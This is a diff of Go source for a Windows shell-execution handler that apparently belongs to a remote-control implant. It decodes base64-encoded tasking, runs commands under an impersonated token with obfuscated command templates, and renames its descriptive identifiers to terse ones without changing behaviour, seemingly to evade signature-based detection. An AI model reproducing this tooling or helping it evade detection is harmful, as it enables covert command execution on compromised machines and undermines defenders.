@@ -49,11 +49,11 @@ func winShellTpl(idx int) string {
 	return ""
 }
 
-type ShellCommand struct{}
+type ExecMsg struct{}
 
-func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
+func (c *ExecMsg) execute(ctx *OpCtx, args []string) OpResult {
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data); err == nil {
 			var tplData struct {
 				Templates []string `json:"tpl"`
 			}
@@ -64,10 +64,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if len(args) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output: "",
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -81,19 +81,19 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		switch args[i] {
 		case "--timeout":
 			if i+1 >= len(args) {
-				return CommandResult{
+				return OpResult{
 					Output:      Err(E20),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
 
 			timeoutSeconds, err := strconv.Atoi(args[i+1])
 			if err != nil || timeoutSeconds <= 0 {
-				return CommandResult{
+				return OpResult{
 					Output:      ErrCtx(E22, args[i+1]),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
 			timeout = time.Duration(timeoutSeconds) * time.Second
@@ -106,10 +106,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if len(commandArgs) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -150,7 +150,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 }
 
 // executeWithToken executes a command using the provided token
-func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder, token syscall.Token) CommandResult {
+func (c *ExecMsg) executeWithToken(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder, token syscall.Token) OpResult {
 	// Try to enable required privileges
 	EnablePrivilege(winShellTpl(idxWinShellPrivImperson))
 
@@ -158,10 +158,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	cmdLine := fmt.Sprintf(winShellTpl(idxWinShellCmdFmt), commandStr)
 	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -170,10 +170,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	if workingDir != "" {
 		workDirPtr, err = syscall.UTF16PtrFromString(workingDir)
 		if err != nil {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E19),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 	}
@@ -187,10 +187,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	err = syscall.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer syscall.CloseHandle(stdoutRead)
@@ -198,10 +198,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	err = syscall.CreatePipe(&stderrRead, &stderrWrite, &sa, 0)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer syscall.CloseHandle(stderrRead)
@@ -251,10 +251,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 		)
 
 		if ret == 0 {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E43),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 	}
@@ -312,10 +312,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 		TerminateProcess(pi.Process, 124)
 		CloseHandle(pi.Process)
 		CloseHandle(pi.Thread)
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E9),
-			ExitCode:    124,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    124,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -327,15 +327,15 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	CloseHandle(pi.Process)
 	CloseHandle(pi.Thread)
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    int(exitCode),
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    int(exitCode),
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // executeNormal executes a command normally without token impersonation
-func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder) CommandResult {
+func (c *ExecMsg) executeNormal(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder) OpResult {
 	// Create command with context for timeout
 	execContext, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
@@ -356,7 +356,7 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
 
-	// Execute the command
+	// execute the command
 	err := cmd.Run()
 
 	// Add stdout to output
@@ -376,10 +376,10 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 	if err != nil {
 		// Check if it was a timeout
 		if execContext.Err() == context.DeadlineExceeded {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E9),
-				ExitCode:    124,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    124,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 
@@ -389,16 +389,16 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 			exitCode = exitErr.ExitCode()
 		}
 
-		return CommandResult{
+		return OpResult{
 			Output:      output.String(),
-			ExitCode:    exitCode,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    exitCode,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
